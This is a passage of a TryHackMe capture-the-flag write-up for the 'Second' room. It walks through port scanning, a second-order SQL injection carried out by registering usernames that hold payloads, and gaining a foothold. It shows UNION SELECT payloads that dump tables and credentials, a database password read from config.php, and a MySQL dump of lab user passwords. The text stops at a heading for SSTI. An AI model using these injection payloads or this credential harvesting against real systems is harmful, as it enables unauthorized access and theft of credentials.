## Second — TryHackMe Writeup

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/second.png)

**Room Description:** You Shall Fear The Second Order.

> *"Being second isn't such a bad thing, but not in this case."*

---

## Objectives

* [*] **User Flag:** `user.txt`
* [*] **Root Flag:** `root.txt`

---

## Enumeration & Reconnaissance

### 1. Port Scanning

We begin initial enumeration using `rustscan` coupled with standard `nmap` version scanning scripts:

```bash
rustscan -a second.thm --ulimit 5000 -- -sCV -O

```

#### Open Ports

| Port | State | Service | Service Version / Info |
| --- | --- | --- | --- |
| **`22/tcp`** | `OPEN` | **SSH** | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| **`8000/tcp`** | `OPEN` | **HTTP** | Werkzeug httpd 2.0.3 (Python 3.8.10) |

#### Discovered endpoints

```
/register
/login
/logout
```

> Output

```nmap
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:fd:b6:d0:ea:82:f3:75:85:2d:09:73:13:cb:94:ea (RSA)
|   256 8d:51:a6:07:22:62:68:82:a3:ec:7a:a6:e6:5b:d9:5b (ECDSA)
|_  256 0e:fd:07:8b:3f:ff:b5:c0:d5:4d:f6:53:4a:d8:ec:87 (ED25519)

8000/tcp open  http    syn-ack ttl 62 Werkzeug httpd 2.0.3 (Python 3.8.10)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Login
```

---

## Second Order SQL-Injection

> Registering with a new user

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-01%2022-31-42.png)

> Logging in

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-01%2022-31-26.png)

> Dashboard: Looks like the only functionality is counting words. 

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-01%2022-32-38.png)

> Hmm, it prints the word count, and my name? I instantly thought what if I registered with a user with a username with "{{ 7*7 }}"?

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-02%2021-46-21.png)

> Let's try a Second order SSTI. Okay, it did not work.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-01%2023-16-20.png)

> Hmm... Let's try Second order SQLi. I registered a username "'ORDER BY 1-- -", and logged in. Let's try if it gives us something...

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-02%2021-47-24.png)

> Oh, it gave a 500 error. Which is good news!

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-02%2021-46-21.png)

> So after some trial and error, I learned the dbms, column count, etc. Then I wrote a custom script that automates registering a user with a unique email, username (which includes our SQL payloads), and password, and then uses the word count functionality that dumps information from the database. Please find the script [here](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/dump.py)

> Using the python script, I found a user and his password: smokey.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-02%2022-38-41.png)

---

## Initial Foothold: Low-privileged user - smokey

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-02%2023-21-45.png)

> After some enumeration, I discovered this configuration file inside `/var/www/dev_site/` directory which contained a mysql password

```bash
smokey@ip-10-130-169-249:/var/www$ ls
dev_site  html
smokey@ip-10-130-169-249:/var/www$ cd dev_site/
smokey@ip-10-130-169-249:/var/www/dev_site$ ls
config.php  index.php  logout.php  welcome.php
smokey@ip-10-130-169-249:/var/www/dev_site$ cat config.php
<?php
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'smokey');
define('DB_PASSWORD', '$tr0nG_P@sS_W0rD@!');
define('DB_NAME', 'dev_site');
/* Attempt to connect to MySQL database */
$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($mysqli === false){
        die("ERROR: Could not connect. " . $mysqli->connect_error);
}
?>
smokey@ip-10-130-169-249:/var/www/dev_site$ 
```

> I used it to login to mysql, and found credentials for the user `hazel`. I tried it for ssh, but clearly, it was not meant for it.

```bash
smokey@ip-10-130-169-249:/var/www/dev_site$ mysql -u smokey -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 331
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| dev_site           |
| information_schema |
| performance_schema |
| second_project     |
| website            |
+--------------------+
5 rows in set (0.00 sec)

mysql> use second_project
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+--------------------------+
| Tables_in_second_project |
+--------------------------+
| users                    |
+--------------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------+------------------+
| id | username | password             | email            |
+----+----------+----------------------+------------------+
|  1 | hazel    | N0t_My_SsH_p@s$w0rD1 | hazel@email.boop |
+----+----------+----------------------+------------------+
1 row in set (0.00 sec)

```

> And there's the payloads we used for the main website.

```shell
mysql> use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_website |
+-------------------+
| users             |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+------------------------------------------------------------------------------------------------------------------+---------------+----------------------+
| id | username                                                                                                         | password      | email                |
+----+------------------------------------------------------------------------------------------------------------------+---------------+----------------------+
|  1 | smokey                                                                                                           | Sm0K3s_Th3C@t | smokey@email.boop    |
|  2 | murcy1                                                                                                           | murcy123      | murcy@murcy.com      |
|  3 | ' ORDER BY 1-- -                                                                                                 | murcy123      | murcy0@gmail.com     |
|  4 | ' ORDER BY 2-- -                                                                                                 | murcy123      | murcy1@gmail.com     |
|  5 | ' UNION SELECT 'ALPHA', 2, 3, 4--                                                                                | Password123!  | user_e5cb2c@test.com |
|  6 | ' UNION SELECT 1, 'ALPHA', 3, 4--                                                                                | Password123!  | user_e0c00f@test.com |
|  7 | ' UNION SELECT 1, 2, 'ALPHA', 4--                                                                                | Password123!  | user_e3c613@test.com |
|  8 | ' UNION SELECT 1, 2, 3, 'ALPHA'--                                                                                | Password123!  | user_17d89d@test.com |
|  9 | ' UNION SELECT 1, version(), 3, 4--                                                                              | murcy123      | murcy8c2@murcy.com   |
| 10 | ' UNION SELECT 1, GROUP_CONCAT(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database()--  | murcy123      | murcyc0b@murcy.com   |
| 11 | ' UNION SELECT 1, GROUP_CONCAT(CONCAT_WS(':', username, password)), 3, 4 FROM users--                            | murcy123      | murcy77d@murcy.com   |
+----+------------------------------------------------------------------------------------------------------------------+---------------+----------------------+
11 rows in set (0.00 sec)

mysql> 
```

> Then, I found a directory under `/opt/app/` that are owned by hazel which looks like another website.

```shell
smokey@ip-10-130-169-249:/var/www/dev_site$ find / -user hazel 2>/dev/null
/opt/app
/opt/app/templates
/opt/app/templates/login.html
/opt/app/templates/register.html
/opt/app/templates/index.html
/opt/app/static
/opt/app/static/style.css
/opt/app/app.py

smokey@ip-10-130-169-249:/var/www/dev_site$ ls -l /opt/app
total 16
-rw-r--r-- 1 hazel hazel 4107 Mar  2  2022 app.py
drwxr-xr-x 2 hazel hazel 4096 Mar  2  2022 static
drwxr-xr-x 2 hazel hazel 4096 Mar  2  2022 templates
```

---

## Second-Order SSTI (Server Side Template Injection)

